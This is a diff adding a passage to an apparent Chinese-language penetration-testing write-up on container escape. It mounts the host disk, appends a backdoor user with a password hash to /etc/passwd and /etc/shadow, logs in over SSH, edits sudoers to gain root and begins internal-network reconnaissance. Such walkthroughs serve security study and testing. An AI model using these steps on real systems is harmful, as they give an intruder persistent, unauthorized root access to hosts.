@@ -7274,3 +7274,47 @@ CapEff 对应的掩码值为0000003fffffffff 或者是 0000001fffffffff则是特
 **查看挂载磁盘设备**：`fdisk -l`
 
 <img src="image/image-20240815205620613.png" alt="image-20240815205620613" style="zoom:80%;" />
+
+**挂载宿主机磁盘到test目录：**
+
+`mkdir /test && mount /dev/sda1 /test`
+
+![image-20240816015838999](image/image-20240816015838999.png)
+
+**成功挂载，向passwd和shadow文件中写入新用户**
+
+在自己的服务器上创建一个test用户密码123456，并加入root组
+
+![image-20240816020354970](image/image-20240816020354970.png)
+
+![image-20240816020516739](image/image-20240816020516739.png)
+
+将这一行分别写入目标的对应文件
+
+```
+echo test:x:1001:1001::/home/test:/bin/sh >> /etc/passwd
+echo test:\$y\$j9T\$c0y6BxqSX5OSoC.6iYLgp.\$OQyZCj8BlQhyJMZpSwTT/KPCJ3h7hojqr7fOMlHmZJ3:19950:0:99999:7::: >> /etc/shadow
+```
+
+添加成功之后通过ssh连接
+
+<img src="image/image-20240816201950306.png" alt="image-20240816201950306" style="zoom:80%;" />
+
+成功连接ssh，可以看见我们的用户不在sudoers目录下
+
+![image-20240816203145999](image/image-20240816203145999.png)
+
+编辑文件加入
+
+![](image/image-20240816203738564.png)
+
+提权成功
+
+<img src="image/image-20240816203815426.png" alt="image-20240816203815426" style="zoom:80%;" />
+
+### 内网信息搜集
+
+发现除了我们的目标ip外还有一个网卡，猜测是内网
+
+![image-20240816205423469](image/image-20240816205423469.png)
+
